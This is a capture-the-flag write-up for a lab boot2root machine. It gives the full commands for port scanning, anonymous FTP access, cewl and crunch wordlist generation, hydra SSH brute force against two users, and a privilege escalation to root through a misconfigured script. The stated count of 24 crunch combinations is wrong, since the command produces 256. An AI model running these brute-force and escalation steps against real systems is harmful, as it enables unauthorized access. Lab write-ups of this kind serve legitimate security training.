# CTF Writeup – HackerSchool Machine

##  Basic Information

| Field | Details |
|---|---|
| **Target IP** | 192.168.29.70 |
| **Attacker Machine** | Parrot OS |
| **Difficulty** | Easy–Medium |
| **Category** | Boot2Root / Privilege Escalation |

<center>
  <img src="images/329 (1).png" alt="steps for hacking" width="600">
</center>

<center>
  <img src="images/329 (2).png" alt="steps for hacking" width="600">
</center>
---

## 1. Reconnaissance (Nmap Scan)

```bash
nmap 192.168.29.70 -p- -sV
```

<center>
  <img src="images/329 (10).png" alt="steps for hacking" width="600">
</center>

<center>
  <img src="images/329 (3).png" alt="steps for hacking" width="600">
</center>

### Results

| Port | Service |
|---|---|
| 21/tcp | FTP (vsftpd) |
| 1515/tcp | HTTP (Apache) |
| 3535/tcp | SSH (OpenSSH) |

> FTP allows **anonymous login**

---

## 2. FTP Enumeration

```bash
ftp 192.168.29.70
```

**Login credentials:**

- Username: `ftp`
- Password: *(blank)*

<center>
  <img src="images/329 (7).png" alt="steps for hacking" width="600">
</center>

### Files Found

```bash
get note.txt
cat note.txt
```

<center>
  <img src="images/329 (8).png" alt="steps for hacking" width="600">
</center>

<center>
  <img src="images/329 (9).png" alt="steps for hacking" width="600">
</center>

**Output:**

```
Planning to join our team? Try to login as Jack.
```

> **Clue:** Target user = `jack`

---

## 3. Web Enumeration

Access the web application at:

```
http://192.168.29.70:1515
```
<center>
  <img src="images/329 (11).png" alt="steps for hacking" width="600">
</center>
### Generate Wordlist Using CeWL

```bash
cewl -d 1 -m 4 -w passwords.txt http://192.168.29.70:1515
```
<center>
  <img src="images/329 (12).png" alt="steps for hacking" width="600">
</center>
> Scrapes the webpage content and generates a custom wordlist saved to `passwords.txt`

---

## 4. SSH Brute Force — User: `jack`

```bash
hydra -l jack -P passwords.txt ssh://192.168.29.70:3535
```

### Credentials Found

| Field | Value |
|---|---|
| Username | `jack` |
| Password | `Cyberspace` |

<center>
  <img src="images/329 (13).png" alt="steps for hacking" width="600">
</center>
---

## 5. Initial Access

```bash
ssh jack@192.168.29.70 -p 3535
```
<center>
  <img src="images/329 (15).png" alt="steps for hacking" width="600">
</center>

---

## 6. Internal Enumeration (as `jack`)

```bash
ls
cat note.txt
```
<center>
  <img src="images/329 (16).png" alt="steps for hacking" width="600">
</center>

**Output:**

```
Your next step is to login as Goblin.
Hint: password is 4 characters and must contain {a,c,1,5}
```

---

## 7. Wordlist Generation — Crunch

```bash
crunch 4 4 ac15 > goblin.txt
```

Generates all 4-character combinations using the characters: `a`, `c`, `1`, `5`

**Total combinations:** 4! = 24 permutations

<center>
  <img src="images/329 (17).png" alt="steps for hacking" width="600">
</center>
---

## 8. SSH Brute Force — User: `goblin`

```bash
hydra -l goblin -P goblin.txt ssh://192.168.29.70:3535
```

<center>
  <img src="images/329 (18).png" alt="steps for hacking" width="600">
</center>

### Credentials Found

| Field | Value |
|---|---|
| Username | `goblin` |
| Password | `ca51` |

---

## 9. Lateral Movement — Switch to `goblin`

```bash
su goblin
```
<center>
  <img src="images/329 (19).png" alt="steps for hacking" width="600">
</center>

<center>
  <img src="images/329 (20).png" alt="steps for hacking" width="600">
</center>
---

## 10. Privilege Escalation Enumeration

```bash
locate final.sh
```
<center>
  <img src="images/329 (21).png" alt="steps for hacking" width="600">
</center>

**Output:**

```
/usr/share/hs/final.sh
```

---

## 11. Exploitation

<center>
  <img src="images/329 (22).png" alt="steps for hacking" width="600">
</center>

```bash
cd /usr/share/hs
./final.sh final.sh
```

---

## 12. Root Access Gained

```bash
whoami
```
<center>
  <img src="images/329 (23).png" alt="steps for hacking" width="600">
</center>

<center>
  <img src="images/329 (24).png" alt="steps for hacking" width="600">
</center>
**Output:**

```
root
```

> **Root obtained successfully!**

---

##  Key Learning Points

- Anonymous FTP can leak **critical credentials and clues**
- Custom wordlist generation is powerful:
  - `cewl` — scrapes web content for context-aware wordlists
  - `crunch` — generates pattern-based wordlists from known constraints
- **Hydra** is effective for SSH brute forcing when credentials follow weak patterns
- **Enumeration** is the most critical phase of any CTF or pentest
- SUID misconfigured binaries are a common and reliable privilege escalation vector

---

##  Vulnerabilities Identified

| # | Vulnerability | Impact |
|---|---|---|
| 1 | Anonymous FTP enabled | Information disclosure |
| 2 | Weak password policy | Brute-force susceptibility |
| 3 | SSH brute-forceable credentials | Unauthorized access |
| 4 | Sensitive files exposed | Credential/path leakage |
| 5 | SUID misconfiguration (`final.sh`) | Full privilege escalation to root |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service detection |
| `ftp` | Anonymous FTP enumeration |
| `cewl` | Web-based wordlist generation |
| `hydra` | SSH brute force |
| `crunch` | Pattern-based wordlist generation |
| `ssh` | Remote shell access |

---

## Conclusion

This machine demonstrates a complete offensive attack chain:

```
Recon → Enumeration → Credential Harvesting → Lateral Movement → Privilege Escalation
```

Each phase fed directly into the next — open FTP revealed the username, web scraping produced the password, internal notes provided the next target user with constraints, and a misconfigured SUID binary sealed root access.

> **The key takeaway:** Security is only as strong as its weakest link. A single anonymous FTP service with a helpful note was enough to start a chain reaction all the way to root.

---
